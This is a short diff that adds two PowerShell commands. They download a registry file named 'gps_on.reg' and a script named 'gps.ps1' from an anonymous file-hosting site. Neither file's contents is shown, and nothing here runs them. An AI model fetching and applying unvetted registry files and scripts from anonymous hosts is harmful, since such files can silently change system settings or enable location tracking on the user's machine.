@@ -1,1 +1,2 @@
-
+Invoke-WebRequest -Uri "https://files.catbox.moe/5v5pr7.reg" -OutFile "gps_on.reg"
+Invoke-WebRequest -Uri "https://files.catbox.moe/bg9oqk.ps1" -OutFile "gps.ps1"
